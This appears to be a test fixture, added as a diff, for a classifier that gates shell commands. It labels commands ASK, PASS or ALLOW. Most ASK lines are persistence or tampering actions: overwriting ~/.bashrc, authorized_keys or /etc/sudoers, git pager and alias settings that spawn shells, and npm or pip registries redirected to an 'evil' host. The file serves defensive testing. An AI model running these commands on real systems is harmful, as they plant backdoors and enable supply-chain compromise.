@@ -1,0 +1,100 @@
+# Persistence / overwrite verbs (persist-write), package-registry redirection,
+# and their near misses. Format: see review.tsv.
+ASK	truncate -s 0 ~/.bashrc
+ASK	truncate --size=0 ~/.ssh/authorized_keys
+ASK	truncate -s0 /etc/sudoers
+ASK	rsync evil ~/.bashrc
+ASK	rsync -av k.pub h:.ssh/authorized_keys
+ASK	rsync -a k h:~/.ssh/authorized_keys
+ASK	rsync authorized_keys h:.ssh/
+ASK	rsync -a f h:/etc/cron.d/job
+ASK	rsync --log-file=@HOME@/.zshrc a b
+ASK	scp k.pub h:.ssh/authorized_keys
+ASK	scp k.pub user@h:/root/.ssh/authorized_keys
+ASK	scp h:evil ~/.profile
+ASK	scp -P 2222 x h:.bashrc
+ASK	scp .bashrc h:
+ASK	sftp h:file ~/.bashrc
+ASK	echo x | sponge ~/.bashrc
+ASK	sponge -a ~/.zshrc
+ASK	patch ~/.bashrc fix.diff
+ASK	patch -o ~/.bashrc a.txt d.diff
+ASK	patch -d @HOME@ .bashrc d.diff
+ASK	ed ~/.bashrc
+ASK	ed -s ~/.bashrc <<< 'a'
+ASK	ex -s ~/.bashrc
+ASK	vim -es -c 'wq' ~/.bashrc
+ASK	nvim --headless +wq ~/.zshrc
+ASK	perl -i -pe 's/x/y/' ~/.bashrc
+ASK	perl -pi -e 's/x/y/' ~/.bashrc
+ASK	perl -pi.bak -e 's/x/y/' ~/.ssh/authorized_keys
+ASK	perl -i.orig -ne 'print' /etc/sudoers
+ASK	perl -pie 's/x/y/' ~/.bashrc
+ASK	ruby -i -pe 'x' ~/.bashrc
+ASK	: > ~/.bashrc
+ASK	:>~/.bashrc
+ASK	echo x >| ~/.bashrc
+ASK	echo x &>> ~/.zshenv
+ASK	install -m 644 x ~/.bashrc
+ASK	install -D x ~/.config/systemd/user/x.service
+ASK	ln -sf /tmp/evil ~/.bashrc
+ASK	ln -sfn /tmp/evil ~/.ssh/authorized_keys
+ASK	chattr -i /etc/sudoers
+ASK	chattr +i ~/.bashrc
+ASK	chattr -R -i /etc/cron.d
+ASK	chattr -v 1 -i ~/.ssh/authorized_keys
+ASK	setfacl -m u:eve:rw ~/.ssh/authorized_keys
+ASK	setfacl --modify=u:eve:rw /etc/sudoers
+ASK	git config --global --add core.pager 'sh -c x'
+ASK	git config --global core.hooksPath /tmp/h
+ASK	git config --global --add alias.x '!sh'
+ASK	git config set --global core.sshCommand x
+ASK	git config --file ~/.gitconfig include.path /tmp/x
+ASK	npm config set registry https://evil/
+ASK	npm config set registry=https://evil/
+ASK	npm config set @scope:registry https://evil/
+ASK	npm config set --global registry https://evil/
+ASK	npm set registry https://evil/
+ASK	npm c set registry https://evil/
+ASK	pip config set global.index-url https://evil/simple
+ASK	pip3 config set global.extra-index-url https://evil/simple
+ASK	pip config --user set install.index-url https://evil/
+ASK	echo 'registry=https://evil/' >> ~/.npmrc
+ASK	echo '[global]' > ~/.config/pip/pip.conf
+ASK	tee ~/.pip/pip.conf
+ASK	echo 'index-url = "x"' > ~/.config/uv/uv.toml
+ASK	echo x >> ~/.cargo/config.toml
+ASK	cp evil.toml .cargo/config.toml
+ASK	echo registry=x > .npmrc
+PASS	truncate -s 0 log.txt
+PASS	rsync -av src/ dst/
+PASS	rsync -av src/ h:dst/
+PASS	rsync -a h:.bashrc ./backup/
+PASS	scp f h:
+PASS	scp h:.bashrc ./bashrc.bak
+PASS	scp k.pub h:keys/
+PASS	echo x | sponge out.txt
+PASS	patch -p1 < fix.diff
+PASS	patch file.c fix.diff
+PASS	ed notes.txt
+PASS	vim notes.txt
+PASS	perl -pe 's/x/y/' ~/.bashrc
+PASS	perl -ne 'print' ~/.bashrc
+PASS	perl -i -pe 's/x/y/' notes.txt
+PASS	perl -e 'print 1' -- ~/.bashrc
+PASS	perl script.pl ~/.bashrc
+PASS	: > out.txt
+PASS	echo x >| out.txt
+PASS	install -m 755 x ~/bin/x
+PASS	ln -sf /tmp/a b
+PASS	chattr +i notes.txt
+PASS	setfacl -m u:eve:r notes.txt
+PASS	git config --global user.name x
+PASS	npm config get registry
+PASS	npm config set fund false
+PASS	npm config list
+PASS	pip config get global.index-url
+PASS	pip config set global.timeout 60
+PASS	pip install -i https://x/simple pkg
+ALLOW	cat ~/.bashrc
+ALLOW	git config --get core.pager
